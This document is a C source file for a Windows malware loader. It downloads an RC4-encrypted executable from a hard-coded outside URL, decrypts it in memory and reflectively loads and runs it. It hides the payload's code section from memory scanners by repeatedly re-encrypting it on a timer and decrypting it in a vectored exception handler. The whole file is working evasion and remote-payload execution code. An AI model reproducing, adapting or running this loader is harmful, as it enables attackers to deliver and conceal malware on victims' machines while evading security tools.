#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wininet.h>

#pragma comment(lib, "wininet")

#define PRINT_WINAPI_ERR(cApiName) printf("[!] %s Failed With Error: %d\n", cApiName, GetLastError())

typedef struct _PE_HEADERS
{
	PBYTE                    pFileBuffer;
	DWORD                    dwFileSize;

	PIMAGE_NT_HEADERS        pImgNtHdrs;
	PIMAGE_SECTION_HEADER    pImgSecHdr;

	PIMAGE_DATA_DIRECTORY    pEntryImportDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryBaseRelocDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryTLSDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryExceptionDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryExportDataDir;

	BOOL                     bIsDLLFile;
} PE_HEADERS, *PPE_HEADERS;

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef BOOL(WINAPI* MAIN)();

typedef struct _USTRING {
	DWORD Length;
	DWORD MaximumLength;
	unsigned char* Buffer;
} USTRING, *PUSTRING;

typedef NTSTATUS(WINAPI* pSystemFunction032)(PUSTRING uStrBuffer, PUSTRING uStrKey);

HANDLE g_hTimerQueue = INVALID_HANDLE_VALUE;
HANDLE g_hTimer = INVALID_HANDLE_VALUE;
ULONG_PTR g_uPeRXAddress = 0;
SIZE_T g_sPeRXSize = 0;


#define EXEC_WAIT 1
#define RC4_KEY_SIZE 0x10 // 16

BOOL InitialDecrypt(IN PBYTE pBuffer, DWORD dwBufferLen, OUT PBYTE* ppBuffer)
{
	printf("[+] Performing initial decryption\n");
	NTSTATUS STATUS = 0;
	BYTE Rc4Key[RC4_KEY_SIZE] = { 0x47,0xa4,0xff,0xb2,0x89,0x67,0x30,0xe5,0x54,0xb0,0x28,0xbf,0x65,0xab,0xea,0x58 };
	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
	USTRING uStringKey = { .Buffer = Rc4Key, .Length = RC4_KEY_SIZE, .MaximumLength = RC4_KEY_SIZE };

	pSystemFunction032 SystemFunction032 = (pSystemFunction032)GetProcAddress(LoadLibrary(TEXT("Advapi32")), "SystemFunction032");

	DWORD dwOldProtection = 0x00;

	if (!pBuffer || !dwBufferLen)
		return FALSE;

	if ((STATUS = SystemFunction032(&uStringBuffer, &uStringKey)) != 0x00)
	{
		PRINT_WINAPI_ERR("SystemFunction032");
		return FALSE;
	}

	*ppBuffer = uStringBuffer.Buffer;

	return TRUE;
}


BOOL FetchPayloadFromWeb(IN LPCSTR sURL, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize)
{
	printf("[+] Downloading payload\n");
	LPCSTR cUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
	HINTERNET hInternet = NULL;
	HINTERNET hInternetFile = NULL;
	PBYTE lBuffer = NULL;
	PBYTE lTempBuffer = NULL;

	DWORD dwBytesRead = 0;
	SIZE_T totalBytes = 0;

	BOOL isSuccess = TRUE;
	
	if (!(hInternet = InternetOpenA(cUserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0)))
	{
		PRINT_WINAPI_ERR("InternetOpenA");
		isSuccess = FALSE;
		goto _FUNC_CLEANUP;
	}

	if (!(hInternetFile = InternetOpenUrlA(hInternet, sURL, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_HYPERLINK, 0)))
	{
		PRINT_WINAPI_ERR("InternetOpenUrlA");
		isSuccess = FALSE;
		goto _FUNC_CLEANUP;
	}

	lTempBuffer = (PBYTE)LocalAlloc(LPTR, 1024);
	if (!lTempBuffer)
	{
		isSuccess = FALSE;
		goto _FUNC_CLEANUP;
	}

	while (TRUE)
	{
		if (!InternetReadFile(hInternetFile, lTempBuffer, 1024, &dwBytesRead))
		{
			PRINT_WINAPI_ERR("InternetReadFile");
			LocalFree(lBuffer);
			isSuccess = FALSE;
			goto _FUNC_CLEANUP;
		}

		totalBytes += dwBytesRead;

		if (!lBuffer)
		{
			lBuffer = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		}
		else {
			lBuffer = (PBYTE)LocalReAlloc(lBuffer, totalBytes, LMEM_MOVEABLE | LMEM_ZEROINIT);
		}

		if (!lBuffer)
		{
			isSuccess = FALSE;
			goto _FUNC_CLEANUP;
		}

		memcpy((PVOID)(lBuffer + (totalBytes - dwBytesRead)), lTempBuffer, dwBytesRead);

		memset(lTempBuffer, '\0', dwBytesRead);

		if (dwBytesRead < 1024)
			break;
	}


	if (!InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0))
	{
		PRINT_WINAPI_ERR("InternetSetOptionA");
		isSuccess = FALSE;
		goto _FUNC_CLEANUP;
	}

	*ppBuffer = lBuffer;
	*pdwFileSize = (DWORD)totalBytes;

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	//LocalFree(lBuffer);
	LocalFree(lTempBuffer);

	return isSuccess;

_FUNC_CLEANUP:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);

	return isSuccess;
}


BOOL InitializePeStruct(OUT PPE_HEADERS pPeHeaders, IN PBYTE pFileBuffer, IN DWORD dwFileSize)
{
	printf("[+] Initializing PE Headers\n");
	if (!pPeHeaders || !pFileBuffer || !dwFileSize)
		return FALSE;

	pPeHeaders->pFileBuffer = pFileBuffer;
	pPeHeaders->dwFileSize = dwFileSize;
	pPeHeaders->pImgNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);

	if (pPeHeaders->pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	pPeHeaders->bIsDLLFile = (pPeHeaders->pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;
	pPeHeaders->pImgSecHdr = IMAGE_FIRST_SECTION(pPeHeaders->pImgNtHdrs);
	pPeHeaders->pEntryImportDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	pPeHeaders->pEntryBaseRelocDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pPeHeaders->pEntryTLSDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	pPeHeaders->pEntryExceptionDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	pPeHeaders->pEntryExportDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	return TRUE;
}


BOOL FixRelocations(IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, IN ULONG_PTR pPeBaseAddress, IN ULONG_PTR pPreferableAddress)
{
	printf("\t> Mapping relocations\n");
	PIMAGE_BASE_RELOCATION pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)(pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);


	ULONG_PTR uDeltaOffset = pPeBaseAddress - pPreferableAddress;

	PBASE_RELOCATION_ENTRY pBaseRelocationEntry = NULL;

	while (pImgBaseRelocation->VirtualAddress)
	{
		pBaseRelocationEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

		while ((PBYTE)pBaseRelocationEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock)
		{
			switch (pBaseRelocationEntry->Type)
			{
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += uDeltaOffset;
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += (DWORD)uDeltaOffset;
				break;

			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += HIWORD(uDeltaOffset);
				break;

			case IMAGE_REL_BASED_LOW:
				*((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += LOWORD(uDeltaOffset);
				break;

			case IMAGE_REL_BASED_ABSOLUTE:
				break;

			default:
				printf("Unknown relocation type %d | Offset: 0x%08X \n", pBaseRelocationEntry->Offset, pBaseRelocationEntry->Offset);
				return FALSE;
			}

			pBaseRelocationEntry++;
		}
		pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocationEntry;
	}
	return TRUE;
}

BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYTE pPeBaseAddress)
{
	printf("\t> Mapping IAT\n");
	PIMAGE_IMPORT_DESCRIPTOR pImgDescriptor = NULL;

	for (SIZE_T i = 0; i < pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
	{
		pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddress + pEntryImportDataDir->VirtualAddress + i);

		if (pImgDescriptor->OriginalFirstThunk == 0 && pImgDescriptor->FirstThunk == 0)
			break;


		LPSTR cDllName					 = (LPSTR)(pPeBaseAddress + pImgDescriptor->Name);
		ULONG_PTR uOriginalFirstThunkRVA = pImgDescriptor->OriginalFirstThunk;
		ULONG_PTR uFirstThunkRVA		 = pImgDescriptor->FirstThunk;
		SIZE_T ImgThunkSize				 = 0;
		HMODULE hModule					 = NULL;

		if (!(hModule = LoadLibraryA(cDllName)))
		{
			PRINT_WINAPI_ERR("LoadLibraryA");
			return FALSE;
		}

		while (TRUE)
		{
			PIMAGE_THUNK_DATA pOriginalFirstThunk  = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uOriginalFirstThunkRVA + ImgThunkSize);
			PIMAGE_THUNK_DATA pFirstThunk		   = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uFirstThunkRVA + ImgThunkSize);
			PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
			ULONG_PTR pFuncAddress				   = 0;

			if (pOriginalFirstThunk->u1.Function == 0 && pFirstThunk->u1.Function == 0)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal))
			{
				
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, MAKEINTRESOURCEA(IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal)))))
				{
					printf("Could not import !%s#%d\n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
					return FALSE;
				}
			}
			else
			{
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, pImgImportByName->Name)))
				{
					printf("Could not import !%s.%s\n", cDllName, pImgImportByName->Name);
					return FALSE;
				}
			}

			pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;

			ImgThunkSize += sizeof(IMAGE_THUNK_DATA);

		}
	}
	return TRUE;
}

BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHeaders, IN PIMAGE_SECTION_HEADER pImgSecHeader)
{
	printf("\t> Setting memory permissions\n");
	for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++)
	{
		DWORD dwProtection = 0;
		DWORD dwOldProtection = 0;

		if (!pImgSecHeader[i].SizeOfRawData || !pImgSecHeader[i].VirtualAddress)
			continue;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;


		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;


		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		
		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;


		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;


		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
		{
			if (!g_uPeRXAddress)
				// save RX base address
				g_uPeRXAddress = pPeBaseAddress + pImgSecHeader[i].VirtualAddress;

			if (!g_sPeRXSize)
				// save RX memory size
				g_sPeRXSize = pImgSecHeader[i].SizeOfRawData;

			dwProtection = PAGE_EXECUTE_READ;
		}


		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;


		if (!VirtualProtect((PVOID)(pPeBaseAddress + pImgSecHeader[i].VirtualAddress), pImgSecHeader[i].SizeOfRawData, dwProtection, &dwOldProtection))
		{
			PRINT_WINAPI_ERR("VirtualProtect");
			return FALSE;
		}
	}

	return TRUE;
}


BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN BOOL bDecrypt)
{
	NTSTATUS STATUS = 0;
	BYTE Rc4Key[RC4_KEY_SIZE] = { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF, 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };
	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
	USTRING uStringKey = { .Buffer = Rc4Key, .Length = RC4_KEY_SIZE, .MaximumLength = RC4_KEY_SIZE };

	pSystemFunction032 SystemFunction032 = (pSystemFunction032)GetProcAddress(LoadLibrary(TEXT("Advapi32")), "SystemFunction032");

	DWORD dwOldProtection = 0x00;

	if (!pBuffer || !dwBufferLen)
		return FALSE;

	// change permissions to RW to enc / dec
	if (!VirtualProtect(pBuffer, dwBufferLen, PAGE_READWRITE, &dwOldProtection))
	{
		PRINT_WINAPI_ERR("VirtualProtect [1]");
		return FALSE;
	}

	if ((STATUS = SystemFunction032(&uStringBuffer, &uStringKey)) != 0x00)
	{
		PRINT_WINAPI_ERR("SystemFunction032");
		return FALSE;
	}

	// set mem permission back to RO/RX
	if (!VirtualProtect(pBuffer, dwBufferLen, (bDecrypt == TRUE ? PAGE_EXECUTE_READ : PAGE_READONLY), &dwOldProtection))
	{
		PRINT_WINAPI_ERR("VirtualProtect [2]");
		return FALSE;
	}

	return TRUE;
}

VOID CALLBACK FluxTimerCallback(IN PVOID lpParameter, IN BOOLEAN TimerOrWaitFired)
{
	Rc4EncryptDecrypt((PBYTE)g_uPeRXAddress, (DWORD)g_sPeRXSize, FALSE);
}

LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo)
{
	printf("[!] Exception raised!\n");
	printf("\t> Status: ");

	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION)
	{
		// make sure exception address is in the RX (.text) section of the PE
		if ((ULONG_PTR)(pExceptionInfo->ExceptionRecord->ExceptionAddress) >= g_uPeRXAddress && (ULONG_PTR)(pExceptionInfo->ExceptionRecord->ExceptionAddress) <= (g_uPeRXAddress + (ULONG_PTR)g_sPeRXSize))
		{
			DWORD dwOldProtection = 0x00;
			printf("[*] HANDLED [*] \n");

			if (!g_hTimerQueue || !g_hTimer)
				goto _FAILURE;

			// decrypt data at g_uPeRXAddress and mark as RX
			if (!Rc4EncryptDecrypt((PBYTE)g_uPeRXAddress, (DWORD)g_sPeRXSize, TRUE))
				goto _FAILURE;


			// execute the obfuscationtimercallback func after EXEC_WAIT seconds
			if (!CreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)FluxTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00))
			{
				PRINT_WINAPI_ERR("CreateTimerQueueTimer");
				goto _FAILURE;
			}

			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	printf("[-] UNHANDLED [-] \n");

_FAILURE:
	return EXCEPTION_CONTINUE_SEARCH;
}



BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
{
	printf("[+] Loading PE into memory\n");

	if (!pPeHeaders)
		return FALSE;

	PBYTE pPeBaseAddress = NULL;
	PVOID pEntryPoint = NULL;
	PVOID pVeHandler = NULL;

	if ((pPeBaseAddress = VirtualAlloc(NULL, pPeHeaders->pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
	{
		PRINT_WINAPI_ERR("VirtualAlloc");
		return FALSE;
	}

	for (int i = 0; i < pPeHeaders->pImgNtHdrs->FileHeader.NumberOfSections; i++)
	{
		memcpy(
			(PVOID)(pPeBaseAddress + pPeHeaders->pImgSecHdr[i].VirtualAddress),
			(PVOID)(pPeHeaders->pFileBuffer + pPeHeaders->pImgSecHdr[i].PointerToRawData),
			pPeHeaders->pImgSecHdr[i].SizeOfRawData
		);
	}

	if (!FixRelocations(pPeHeaders->pEntryBaseRelocDataDir, (ULONG_PTR)pPeBaseAddress, pPeHeaders->pImgNtHdrs->OptionalHeader.ImageBase))
		return FALSE;

	if (!FixImportAddressTable(pPeHeaders->pEntryImportDataDir, pPeBaseAddress))
		return FALSE;

	if (!FixMemPermissions((ULONG_PTR)pPeBaseAddress, pPeHeaders->pImgNtHdrs, pPeHeaders->pImgSecHdr))
		return FALSE;

	if (!g_uPeRXAddress || !g_sPeRXSize)
		return FALSE;

	// set exception handlers
	if (pPeHeaders->pEntryExceptionDataDir->Size)
	{
		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pPeBaseAddress + pPeHeaders->pEntryExceptionDataDir->VirtualAddress);
		if (!RtlAddFunctionTable(pImgRuntimeFuncEntry, (pPeHeaders->pEntryExceptionDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), (DWORD64)pPeBaseAddress))
		{
			PRINT_WINAPI_ERR("RtlAddFunctionTable");
			return FALSE;
		}
	}

	printf("[*] Registering Vectored Exception Handler\n");
	// Register a VEH
	if (!(pVeHandler = AddVectoredExceptionHandler(0x01, VectoredExceptionHandler)))
	{
		PRINT_WINAPI_ERR("AddVectoredExceptionHandler");
		return FALSE;
	}

	// Execute TLS callbacks
	if (pPeHeaders->pEntryTLSDataDir->Size)
	{
		PIMAGE_TLS_DIRECTORY pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)(pPeBaseAddress + pPeHeaders->pEntryTLSDataDir->VirtualAddress);

		PIMAGE_TLS_CALLBACK* pImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);
		for (int i = 0; pImgTlsCallback[i] != NULL; i++)
		{
			pImgTlsCallback[i]((LPVOID)pPeBaseAddress, DLL_PROCESS_ATTACH, NULL);
		}
	}
	
	pEntryPoint = (PVOID)(pPeBaseAddress + pPeHeaders->pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	printf("[*] Queuing encryption fluctuation timer\n");
	printf("\t>Exec Mem 0x%p | Size [ %ld ]\n", (PVOID)g_uPeRXAddress, (ULONG)g_sPeRXSize);
	if (g_hTimerQueue == INVALID_HANDLE_VALUE)
		g_hTimerQueue = CreateTimerQueue();

	if (!CreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)FluxTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00))
	{
		PRINT_WINAPI_ERR("CreateTimerQueueTimer");
		return FALSE;
	}

	printf("[+] Executing PE Entrypoint\n");
	MAIN pMain = (MAIN)pEntryPoint;
	// ( *( VOID(*)() ) pEntryPoint )(); 
	return pMain();
}

#define GET_FILENAME(path) (strrchr(path, '\\') ? strrchr(path, '\\') + 1 : path)

int main(int argc, char* argv[])
{
	PBYTE pFileBuffer = NULL;
	DWORD dwFileSize = 0;
	PE_HEADERS peHeaders = { 0 };
	LPCSTR sURL = "https://bullworthless.com/19461b00-56f8-11ee-94ef-128911d0d8fb/0590a5a0-941e-4401-a0c1-99c3b5196814.txt";

	if (!FetchPayloadFromWeb(sURL, &pFileBuffer, &dwFileSize))
		return -1;

	PBYTE pDecBuffer = LocalAlloc(LPTR, dwFileSize);
	if (!InitialDecrypt(pFileBuffer, dwFileSize, &pDecBuffer))
		return -1;


	if (!InitializePeStruct(&peHeaders, pDecBuffer, dwFileSize))
		return -1;

	LocalPeExec(&peHeaders);

	return 0;
}